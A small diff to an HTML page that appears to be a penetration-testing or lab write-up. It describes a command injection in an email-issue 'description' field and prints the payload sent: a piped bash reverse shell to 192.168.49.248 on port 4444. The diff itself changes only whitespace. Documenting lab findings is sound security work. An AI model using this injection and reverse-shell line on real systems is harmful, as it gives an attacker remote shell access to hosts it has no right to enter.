@@ -119,8 +119,11 @@ Service detection performed. Please report any incorrect results at https://nmap
     </ul>
 
     <h2><a id="hostmaster">Shell - hostmaster</a></h2>
-    
+
     <li>The user input does not go through any sanitization.  It gets passed directly into the "cmd" variable which then gets executed as a shell command.  In order to exploit this all we need to do is add a pipe before whatever command we want to send in the "description" portion of the command for email issues.</li>
+
+    <br>
+    
     <li>I send a command and receieve a reverse shell on 4444</li>
     <ul>
         <li>Sent: email:test@test.com description:| bash -c &#039;bash -i &gt;&amp; /dev/tcp/192.168.49.248/4444 0&gt;&amp;1&#039;</li>
